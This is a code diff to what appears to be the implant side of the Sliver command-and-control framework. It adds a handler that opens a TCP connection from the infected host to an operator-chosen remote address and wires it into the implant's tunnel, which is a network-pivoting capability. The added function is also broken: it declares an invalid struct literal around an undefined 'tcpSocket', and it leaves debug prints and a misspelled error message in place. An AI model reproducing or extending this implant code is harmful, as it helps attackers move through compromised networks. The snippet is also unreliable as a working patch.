@@ -19,7 +19,11 @@ package handlers
 */
 
 import (
+	"bufio"
+	"fmt"
 	"io"
+	"io/ioutil"
+	"net"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -40,6 +44,7 @@ const (
 var (
 	tunnelHandlers = map[uint32]TunnelHandler{
 		sliverpb.MsgShellReq: shellReqHandler,
+		sliverpb.MsgTCPTunnelReq: tcpTunnelReqHandler,
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
@@ -220,4 +225,44 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
+}
+
+func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	fmt.Println("A call to tcpTunnelReqHandler()")
+
+	tcpTunnelReq := &sliverpb.TCPTunnelReq{}
+	err := proto.Unmarshal(envelope.Data, tcpTunnelReq)
+	if err != nil {
+		fmt.Println("Failed unmarshel request")
+		return
+	}
+
+	remoteHost := tcpTunnelReq.RemoteHost
+	remotePort := tcpTunnelReq.RemotePort
+
+	remoteAddressString := fmt.Sprintf("%s:%d", remoteHost, remotePort)
+
+	fmt.Println(remoteAddressString)
+	remoteAddress, err := net.ResolveTCPAddr("tcp4", remoteAddressString)
+	if err != nil {
+		fmt.Println("Failed resolving remote address")
+		return
+	}
+
+	remoteConn, err := net.DialTCP("tcp4", nil, remoteAddress)
+	if err != nil {
+		fmt.Println("Failed connecting to remote address")
+		return
+	}
+
+	tcpReadCloser := struct {
+		tcpSocket
+	}
+
+	tunnel := &transports.Tunnel{
+		ID:     tcpTunnelReq.TunnelID,
+		Reader: ioutil.NopCloser(bufio.NewReader(remoteConn)),
+		Writer: bufio.NewWriter(remoteConn),
+	}
+	connection.AddTunnel(tunnel)
 }
